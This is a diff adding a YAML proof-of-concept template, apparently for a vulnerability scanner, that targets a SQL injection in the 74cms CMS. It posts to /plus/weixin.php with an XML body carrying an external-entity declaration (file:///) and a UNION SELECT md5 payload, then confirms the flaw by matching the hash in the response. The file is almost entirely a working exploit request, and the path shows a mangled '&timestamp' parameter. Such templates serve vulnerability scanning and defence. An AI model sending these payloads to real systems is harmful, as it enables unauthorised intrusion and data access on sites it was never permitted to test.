@@ -1,0 +1,25 @@
+id: poc-yaml-74cms-sqli-1
+info:
+  name: 74cms 1 SQL注入漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: 74cms
+  reference: []
+  description: null
+variables:
+  rand: random_int(10000, 21000)
+transport: http
+requests:
+- method: POST
+  path: /plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709\xc3\x97tamp=&nonce=
+  headers:
+    Content-Type: text/xml
+  data: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM
+    "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%'
+    union select md5({{.rand}})#</Content></xml>
+  redirect: false
+  raw: null
+  timeout: null
+  expression: contains(body, md5(rand))
+  output: []
